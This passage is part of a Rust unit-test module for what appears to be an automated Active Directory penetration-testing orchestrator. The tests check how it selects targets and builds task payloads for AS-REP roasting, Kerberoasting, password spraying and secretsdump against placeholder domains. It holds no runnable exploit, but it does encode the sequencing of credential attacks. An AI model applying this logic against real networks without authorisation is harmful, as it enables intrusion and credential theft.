        s.domains.push("contoso.local".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.users.push(make_user("alice", "contoso.local"));
        let work = select_asrep_work(&s);
        assert_eq!(work[0].2, "contoso.local:users");
    }

    #[test]
    fn select_asrep_ignores_machine_account_users_when_picking_key() {
        let mut s = StateInner::new("op".into());
        s.domains.push("contoso.local".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        // Only a machine account → still empty.
        s.users.push(make_user("DC01$", "contoso.local"));
        let work = select_asrep_work(&s);
        assert_eq!(work[0].2, "contoso.local:empty");
    }

    #[test]
    fn select_asrep_falls_back_to_target_ips() {
        let mut s = StateInner::new("op".into());
        s.domains.push("contoso.local".into());
        s.target_ips.push("192.168.58.99".into());
        let work = select_asrep_work(&s);
        assert_eq!(work[0].1, "192.168.58.99");
    }

    #[test]
    fn select_asrep_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.domains.push("contoso.local".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(DEDUP_ASREP_DOMAINS, "contoso.local:empty".into());
        assert!(select_asrep_work(&s).is_empty());
    }

    // --- collect_known_users_for_domain ---------------------------------

    #[test]
    fn collect_known_users_filters_machine_accounts() {
        let mut s = StateInner::new("op".into());
        s.users.push(make_user("alice", "contoso.local"));
        s.users.push(make_user("DC01$", "contoso.local"));
        s.users.push(make_user("bob", "contoso.local"));
        let users = collect_known_users_for_domain(&s, "contoso.local");
        assert_eq!(users, vec!["alice", "bob"]);
    }

    #[test]
    fn collect_known_users_is_sorted_and_deduped() {
        let mut s = StateInner::new("op".into());
        s.users.push(make_user("carol", "contoso.local"));
        s.users.push(make_user("alice", "contoso.local"));
        s.users.push(make_user("alice", "contoso.local"));
        let users = collect_known_users_for_domain(&s, "contoso.local");
        assert_eq!(users, vec!["alice", "carol"]);
    }

    #[test]
    fn collect_known_users_is_case_insensitive_on_domain() {
        let mut s = StateInner::new("op".into());
        s.users.push(make_user("alice", "Contoso.Local"));
        assert_eq!(
            collect_known_users_for_domain(&s, "CONTOSO.LOCAL"),
            vec!["alice"]
        );
    }

    // --- build_asrep_payload -------------------------------------------

    #[test]
    fn build_asrep_cold_start_payload() {
        let p = build_asrep_payload("contoso.local", "192.168.58.10", &[], &[]);
        assert_eq!(p["domain"], "contoso.local");
        assert_eq!(p["target_ip"], "192.168.58.10");
        assert_eq!(p["techniques"][1], "asrep_roast");
        assert_eq!(p["excluded_users"], "");
        // Cold-start instruction
        let instr = p["instructions"].as_str().unwrap();
        assert!(instr.contains("Cold-start AS-REP"));
        assert!(p.get("known_users").is_none());
    }

    #[test]
    fn build_asrep_warm_start_payload_includes_userlist() {
        let users = vec!["alice".into(), "bob".into()];
        let p = build_asrep_payload(
            "contoso.local",
            "192.168.58.10",
            &["locked.user".into()],
            &users,
        );
        assert_eq!(p["known_users"], json!(["alice", "bob"]));
        assert_eq!(p["excluded_users"], "locked.user");
        let instr = p["instructions"].as_str().unwrap();
        assert!(instr.contains("usernames already discovered"));
    }

    // --- resolve_kerberoast_dc -----------------------------------------

    #[test]
    fn resolve_kerberoast_dc_exact_match() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let (ip, dom) = resolve_kerberoast_dc(&s, "contoso.local").unwrap();
        assert_eq!(ip, "192.168.58.10");
        assert_eq!(dom, "contoso.local");
    }

    #[test]
    fn resolve_kerberoast_dc_child_fallback() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("child.contoso.local".into(), "192.168.58.11".into());
        // Cred domain is the parent; resolution falls back to child DC.
        let (ip, dom) = resolve_kerberoast_dc(&s, "contoso.local").unwrap();
        assert_eq!(ip, "192.168.58.11");
        assert_eq!(dom, "child.contoso.local");
    }

    #[test]
    fn resolve_kerberoast_dc_target_ip_fallback() {
        let mut s = StateInner::new("op".into());
        s.target_ips.push("192.168.58.99".into());
        let (ip, dom) = resolve_kerberoast_dc(&s, "contoso.local").unwrap();
        assert_eq!(ip, "192.168.58.99");
        assert_eq!(dom, "contoso.local");
    }

    #[test]
    fn resolve_kerberoast_dc_returns_none_when_no_signals() {
        let s = StateInner::new("op".into());
        assert!(resolve_kerberoast_dc(&s, "contoso.local").is_none());
    }

    // --- select_kerberoast_work ----------------------------------------

    #[test]
    fn select_kerberoast_skips_quarantined() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.quarantine_principal("alice", "contoso.local");
        assert!(select_kerberoast_work(&s, 10).is_empty());
    }

    #[test]
    fn select_kerberoast_caps_at_max_items() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        for u in &["a", "b", "c", "d", "e"] {
            s.credentials.push(make_cred(u, "Pw", "contoso.local"));
        }
        assert_eq!(select_kerberoast_work(&s, 2).len(), 2);
        assert_eq!(select_kerberoast_work(&s, 5).len(), 5);
    }

    #[test]
    fn select_kerberoast_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(
            DEDUP_CRACK_REQUESTS,
            kerberoast_dedup_key("contoso.local", "alice"),
        );
        assert!(select_kerberoast_work(&s, 10).is_empty());
    }

    // --- select_username_spray_work ------------------------------------

    #[test]
    fn select_spray_skips_disabled_built_in_accounts() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.users.push(make_user("guest", "contoso.local"));
        s.users.push(make_user("krbtgt", "contoso.local"));
        s.users.push(make_user("alice", "contoso.local"));
        let work = select_username_spray_work(&s, 10);
        // Only alice survives.
        assert_eq!(work.len(), 1);
        assert!(work[0].0.contains(":alice"));
    }

    #[test]
    fn select_spray_uses_child_domain_dc_fallback() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("child.contoso.local".into(), "192.168.58.11".into());
        s.users.push(make_user("alice", "contoso.local"));
        let work = select_username_spray_work(&s, 10);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].1, "192.168.58.11");
    }

    #[test]
    fn select_spray_caps_at_max_items() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        for u in &["a", "b", "c", "d", "e", "f"] {
            s.users.push(make_user(u, "contoso.local"));
        }
        assert_eq!(select_username_spray_work(&s, 3).len(), 3);
    }

    // --- select_low_hanging_work ---------------------------------------

    #[test]
    fn select_low_hanging_skips_empty_password() {
        let mut s = StateInner::new("op".into());
        s.credentials.push(make_cred("alice", "", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_low_hanging_work(&s, 10).is_empty());
    }

    #[test]
    fn select_low_hanging_target_ips_fallback_when_no_dc() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.target_ips.push("192.168.58.99".into());
        let work = select_low_hanging_work(&s, 10);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].1, "192.168.58.99");
    }

    #[test]
    fn select_low_hanging_skips_dominated_domain() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.dominated_domains.insert("contoso.local".into());

        assert!(select_low_hanging_work(&s, 10).is_empty());
    }

    // --- select_credential_secretsdump_work ----------------------------

    #[test]
    fn select_sd_keeps_same_domain_host_cred_pairs() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        s.hosts
            .push(make_host("sql01.contoso.local", "192.168.58.20"));
        let work = select_credential_secretsdump_work(&s, 10);
        assert_eq!(work.len(), 2);
    }

    #[test]
    fn select_sd_skips_cross_forest_hosts() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.hosts
            .push(make_host("dc01.fabrikam.local", "192.168.58.40"));
        assert!(select_credential_secretsdump_work(&s, 10).is_empty());
    }

    #[test]
    fn select_sd_skips_unknown_domain_hosts() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        // Bare hostname, no DC-IP mapping → unknown domain → skipped.
        s.hosts.push(make_host("mystery", "192.168.58.99"));
        assert!(select_credential_secretsdump_work(&s, 10).is_empty());
    }

    #[test]
    fn select_sd_admin_overrides_delegation_filter() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        let mut details = std::collections::HashMap::new();
        details.insert("account_name".into(), json!("svc_sql"));
        s.discovered_vulnerabilities.insert(
            "v1".into(),
            ares_core::models::VulnerabilityInfo {
                vuln_id: "v1".into(),
                vuln_type: "constrained_delegation".into(),
                target: "192.168.58.10".into(),
                discovered_by: "test".into(),
                discovered_at: chrono::Utc::now(),
                details,
                recommended_agent: String::new(),
                priority: 1,
            },
        );
        s.credentials
            .push(make_cred("svc_sql", "Pw!", "contoso.local"));
        // Non-admin delegation → skipped.
        assert!(select_credential_secretsdump_work(&s, 10).is_empty());
        s.credentials.clear();
        s.credentials
            .push(make_admin_cred("svc_sql", "Pw!", "contoso.local"));
        // Admin override → kept.
        assert_eq!(select_credential_secretsdump_work(&s, 10).len(), 1);
    }

    // --- common_spray_prereqs_met --------------------------------------

    #[test]
    fn common_spray_prereqs_fail_without_asrep() {
        let s = StateInner::new("op".into());
        assert!(!common_spray_prereqs_met(&s, "contoso.local"));
    }

    #[test]
    fn common_spray_prereqs_fail_without_delegation() {
        let mut s = StateInner::new("op".into());
        s.mark_processed(DEDUP_ASREP_DOMAINS, "contoso.local:empty".into());
        assert!(!common_spray_prereqs_met(&s, "contoso.local"));
    }

    #[test]
    fn common_spray_prereqs_fail_with_uncracked_kerberoast() {
        let mut s = StateInner::new("op".into());
        s.mark_processed(DEDUP_ASREP_DOMAINS, "contoso.local:empty".into());
        s.mark_processed(DEDUP_DELEGATION_CREDS, "contoso.local:alice".into());
        s.hashes
            .push(make_hash_kerberoast("svc_sql", "contoso.local", false));
        assert!(!common_spray_prereqs_met(&s, "contoso.local"));
    }

    #[test]
    fn common_spray_prereqs_pass_with_cracked_kerberoast() {
        let mut s = StateInner::new("op".into());
        s.mark_processed(DEDUP_ASREP_DOMAINS, "contoso.local:empty".into());
        s.mark_processed(DEDUP_DELEGATION_CREDS, "contoso.local:alice".into());
        s.hashes
            .push(make_hash_kerberoast("svc_sql", "contoso.local", true));
        assert!(common_spray_prereqs_met(&s, "contoso.local"));
    }

    #[test]
    fn common_spray_prereqs_pass_no_kerberoast() {
        let mut s = StateInner::new("op".into());
        s.mark_processed(DEDUP_ASREP_DOMAINS, "contoso.local:empty".into());
        s.mark_processed(DEDUP_DELEGATION_CREDS, "contoso.local:alice".into());
        assert!(common_spray_prereqs_met(&s, "contoso.local"));
    }

    #[test]
    fn common_spray_prereqs_accepts_users_form_of_asrep_key() {
        let mut s = StateInner::new("op".into());
        s.mark_processed(DEDUP_ASREP_DOMAINS, "contoso.local:users".into());
        s.mark_processed(DEDUP_DELEGATION_CREDS, "contoso.local:alice".into());
        assert!(common_spray_prereqs_met(&s, "contoso.local"));
    }

    // --- select_common_spray_work --------------------------------------

    #[test]
    fn select_common_spray_emits_when_prereqs_met() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(DEDUP_ASREP_DOMAINS, "contoso.local:empty".into());
        s.mark_processed(DEDUP_DELEGATION_CREDS, "contoso.local:alice".into());
        let work = select_common_spray_work(&s);
        assert_eq!(
            work,
            vec![("contoso.local".to_string(), "192.168.58.10".to_string())]
        );
    }

    #[test]
    fn select_common_spray_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(DEDUP_ASREP_DOMAINS, "contoso.local:empty".into());
        s.mark_processed(DEDUP_DELEGATION_CREDS, "contoso.local:alice".into());
        s.mark_processed(
            DEDUP_PASSWORD_SPRAY,
            common_spray_dedup_key("contoso.local"),
        );
        assert!(select_common_spray_work(&s).is_empty());
    }

    // --- payload builders -----------------------------------------------

    #[test]
    fn build_spray_payload_fields() {
        let p = build_username_spray_payload(
            "192.168.58.10",
            "contoso.local",
            &["locked.user".into(), "other".into()],
        );
        assert_eq!(p["technique"], "username_as_password");
        assert_eq!(p["target_ip"], "192.168.58.10");
        assert_eq!(p["domain"], "contoso.local");
        assert_eq!(p["excluded_users"], "locked.user,other");
    }

    #[test]
    fn build_common_spray_payload_fields() {
        let p =
            build_common_spray_payload("192.168.58.10", "contoso.local", &["locked.user".into()]);
        assert_eq!(p["techniques"][0], "password_spray");
        assert_eq!(p["techniques"][1], "username_as_password");
        assert_eq!(p["reason"], "low_hanging_fruit");
        assert_eq!(p["use_common_passwords"], true);
        assert_eq!(p["acknowledge_no_policy"], true);
        assert_eq!(p["excluded_users"], "locked.user");
    }
}
